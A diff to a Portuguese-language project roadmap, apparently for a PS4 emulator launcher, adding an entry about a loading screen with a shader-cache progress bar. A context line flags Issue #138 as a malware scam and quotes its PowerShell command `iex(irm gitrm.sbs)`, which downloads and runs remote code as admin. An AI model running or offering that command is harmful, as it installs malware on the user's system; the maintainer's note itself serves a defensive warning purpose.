@@ -73,6 +73,8 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 20 | Idioma na primeira tela do lançador | ✅ | `8508a33`. Seletor 🌐 no canto da tela de boas-vindas; o lançador reabre no idioma escolhido. |
 | 21 | Imagem de cada save na lista (como no PS4 / shadPS4) | ✅ | O `icon0.png` de cada save à esquerda do título, detalhes e data. |
 
+| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. |
+
 ## Fora do roteiro
 
 - Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
